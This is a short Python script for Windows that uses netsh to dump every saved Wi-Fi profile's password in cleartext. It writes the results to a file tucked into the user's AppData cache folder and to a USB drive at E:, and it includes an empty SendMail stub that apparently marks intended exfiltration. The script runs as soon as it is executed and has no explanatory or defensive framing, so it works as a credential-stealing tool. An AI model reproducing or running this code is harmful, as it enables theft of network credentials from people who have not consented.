import subprocess
from pathlib import Path
import getpass


def AccessWifi():
   passwords = []
   wifi_name = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode('utf-8').split('\n')
   wifi_name = [line.split(":")[1][1:-1] for line in wifi_name if "All User Profile" in line]
   #print(wifi_name) 
   for wifi_pass in wifi_name:
      password = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi_pass, "key=clear"]).decode('utf-8').split('\n')
      password = [line.split(':')[1][1:-1] for line in password if "Key Content" in line]
      try:
         passwords.append(password)
      except IndexError:
         passwords.append("Can not read password")  
   return dict(zip(wifi_name,passwords))

def SendMail():
   pass


def SaveData():
   usb_path = str(getpass.getuser())
   Home = str(Path.home())
   cache = open(str(Home+"\AppData\Local\cache")+"\AccessWifi.txt","w")
   cache.write(str(AccessWifi()))
   cache.close()
   try:
      usb_path = str("E:\AccessWifi\\" + usb_path+".txt")
      usb = open(str(usb_path),"w")
      usb.write(str(AccessWifi()))
      usb.close()
   except:
      pass
  
   
SaveData()